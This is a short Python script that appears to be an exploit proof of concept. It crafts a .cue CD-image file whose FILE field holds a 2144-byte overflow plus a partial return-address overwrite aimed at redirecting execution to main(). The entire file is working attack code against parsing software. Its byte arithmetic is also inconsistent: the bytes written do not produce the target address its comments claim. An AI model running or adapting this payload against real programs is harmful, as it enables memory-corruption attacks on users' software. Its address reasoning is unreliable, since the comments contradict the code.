#!/usr/bin/env python3

# From your functions, let's try jumping to main() again
# main is at 0x40103c
# Original return: 0x402608
# We want:         0x40103c

# Difference is in bytes 2-3:
# Original: ...02 26 08...  
# Target:   ...01 10 3c...

payload = b"A" * 2144
payload += b"\x3c\x10\x01"  # 3 bytes: changes 0x402608 -> 0x40103c
# Leaves upper 5 bytes unchanged

payload += b"Z" * (3000 - len(payload))

with open("formats/cdfs/overflow.cue", "wb") as f:
    f.write(b'FILE "')
    f.write(payload)
    f.write(b'" BINARY\n')
    f.write(b'TRACK 01 MODE1/2352\n')
    f.write(b'  INDEX 01 00:00:00\n')
